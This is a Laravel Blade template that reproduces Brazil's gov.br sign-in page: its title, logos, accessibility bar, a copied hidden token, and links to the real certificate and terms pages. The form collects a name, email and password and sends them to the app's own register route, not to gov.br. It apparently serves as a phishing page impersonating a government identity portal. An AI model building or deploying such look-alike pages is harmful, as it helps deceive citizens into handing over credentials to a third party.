    <form method="POST" action="{{ route('register') }}">
        @csrf

       

       

        

        

        
    </form>


    <!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">

<head>
  <meta charset="utf-8">
  <title>gov.br - Acesse sua conta</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
  <!-- Page CSS -->
  <link rel="stylesheet" href="../css/govbr-highcontrast.css">
  <link rel="stylesheet" href="../css/govbr-templates.css">
  <link rel="stylesheet" href="../css/govbr-modal.css">
  <link rel="stylesheet" href="../css/govbr-eula.css">


<body>
    <header>
        <a href="https://www.gov.br"><img src="../imagem/govbr.png" alt="Logomarca GovBR" /></a>
        <div id="acessibilidade">
            <span>
                <a href="#"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
            </span>
            <span>
                <a href="//www.vlibras.gov.br" target="_BLANK"><i class="fas fa-deaf"></i><span>VLibras</span></a>
            </span>
        </div>
        
    </header>
<div class="container">
	<aside id="aside-signin">
		<img id="identidade-govbr" src="../imagem/icons/conta_govbr_v2.jpg" alt="Logomarca GovBR" />
	</aside>
	<main id="main-signin">
    <x-auth-session-status class="mb-4" :status="session('status')" />
	<form method="POST" id="loginData" action="{{ route('register') }}">
        @csrf

		<div class="card" id="login-cpf">
			<input type="hidden" name="_csrf" value="9e9ba24f-275b-40e2-8992-5f3887b61216" />
			<h3>Identifique-se no gov.br com:</h3>

             <!-- Name -->
        <div>
            <span for="name" :value="__('Name')">Nome</span>
            <input id="name" type="text" name="name" :value="old('name')" required autofocus autocomplete="name" />
            <x-input-error :messages="$errors->get('name')" class="mt-2" />
        </div>

				  <!-- Email Address -->
                  <div class="mt-4">
                    <span for="email" :value="__('Email')">Email</span>
                    <input id="email" class="block mt-1 w-full" type="text" name="email" :value="old('email')" required autocomplete="username" />
                    <x-input-error :messages="$errors->get('email')" class="mt-2" />
                </div>

				 <!-- Password -->
                 <div class="mt-4">
                    <span for="password" :value="__('Password')">Senha</span>
        
                    <input id="password" class="block mt-1 w-full"
                                    type="password"
                                    name="password"
                                    required autocomplete="new-password" />
        
                    <x-input-error :messages="$errors->get('password')" class="mt-2" />
                </div>

                <!-- Confirm Password -->
        <div class="mt-4">
            <span for="password_confirmation" :value="__('Confirm Password')">Confirmar senha</span>

            <input id="password_confirmation" class="block mt-1 w-full"
                            type="password"
                            name="password_confirmation" required autocomplete="new-password" />

            <x-input-error :messages="$errors->get('password_confirmation')" class="mt-2" />
        </div><br>

        <div class="flex items-center justify-end mt-4">
            <a class="underline text-sm text-gray-600 hover:text-gray-900 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500" href="{{ route('login') }}">
                {{ __('Already registered?') }}
            </a>
				<div class="button-panel" id="login-button-panel">
					<button name="action" class="button-continuar" type="submit" tabindex="2">Registrar</button>
				</div>
			

			<span id="title-outras-op">Outras opções de identificação:</span>
			<hr id="hr-outras-op" style="margin: 0 0 0">

			<div class="item-login-signup-ways">
				<img src="../imagem/icons/InternetBanking-green.png" />
				<!-- Para voltar a cor normal, basta apagar o style do link e remover o 'green' do nome da imagem acima. -->
				<a tabindex="5" href="#" style="color:#008C32">Login com seu banco
					<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA   CONTA   SERÁ   PRATA</span>
				</a>
			</div>

			<div class="item-login-signup-ways">
				    <img src="../imagem/icons/qrcode.png" />
						<a tabindex="5" href="#">
							Login com QR code
							<!--img src="../imagens/icons/icons/novo.svg" style="margin-left: 1ex"-->
						</a>
				    </div>
			<div class="item-login-signup-ways" id="cert-digital">
					<img src="../imagem/icons/CD.png"/>
					<a tabindex="4" href="https://certificado.sso.acesso.gov.br/login?client_id=www.gov.br&authorization_id=187deb2d30c">Seu certificado digital</a>
				</div>
			<div class="item-login-signup-ways" id="cert-digital-cloud">
				<img src="../imagem/icons/CD-Nuvem.png" id="cert-digital-cloud-img"/>
				<a tabindex="5" href="#" id="cert-digital-cloud-a" >Seu certificado digital em nuvem</a>
			</div>
			<div class="entenda-id-govbr" id="entenda-id-govbr">
				<span>
					<i class="fa fa-info-circle" aria-hidden="true"></i><a tabindex="6" href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/" id="entenda-id-govbr-a">Entenda a conta gov.br</a>
					<a tabindex="6" href="https://cadastro.acesso.gov.br/termo-de-uso" style="display: block;" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
				</span>
			</div>
		</div>
	</form>
	</main>
</div> 
</body>

</html>






